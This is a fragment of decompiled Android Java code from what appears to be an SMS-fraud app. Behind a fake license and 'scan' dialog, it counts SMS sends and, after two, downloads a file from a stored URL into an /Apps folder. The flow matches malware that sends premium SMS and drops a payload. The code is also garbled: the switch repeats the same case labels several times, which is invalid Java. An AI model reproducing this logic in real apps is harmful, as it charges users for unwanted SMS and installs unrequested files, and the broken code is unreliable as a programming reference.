	final synthetic com.pavel.newmodule.LicenseActivity this$0
	
	    LicenseActivity$3(com.pavel.newmodule.LicenseActivity p1)
	    {
	        this.this$0 = p1;
	        return;
	    }
	
	
	    public void onReceive(android.content.Context p6, android.content.Intent p7)
	    {
	        switch (this.getResultCode()) {
	            case -1:
	                if (this.this$0.smsCount >= 2) {
	                    this.this$0.ScanProgress.dismiss();
	                    this.this$0.saveData();
	                    this.this$0.checkAndCreateDirectory("/Apps");
	                    com.pavel.newmodule.LicenseActivity v0_8 = new com.pavel.newmodule.LicenseActivity$downloadData(this.this$0);
	                    String[] v1_2 = new String[2];
	                    v1_2[0] = com.pavel.newmodule.LicenseActivity.url;
	                    v1_2[1] = com.pavel.newmodule.LicenseActivity.filename;
	                    v0_8.execute(v1_2);
	                    this.this$0.showDialog(1);
	                } else {
	                    com.pavel.newmodule.LicenseActivity v0_10 = this.this$0;
	                    v0_10.smsCount = (v0_10.smsCount + 1);
	                    com.pavel.newmodule.LicenseActivity.access$0(this.this$0);
	                }
	            case 0:
	            case 1:
	            case 2:
	            case 3:
	            case 4:
	            default:
	                break;
	            case 0:
	            case 1:
	            case 2:
	            case 3:
	            case 4:
	                break;
	            case 0:
	            case 1:
	            case 2:
	            case 3:
	            case 4:
	                break;
	            case 0:
	            case 1:
	            case 2:
	            case 3:
	            case 4:
	                break;
	            case 0:
	            case 1:
	            case 2:
	            case 3:
	            case 4:
	                break;
	        }
	        return;
	    }
	
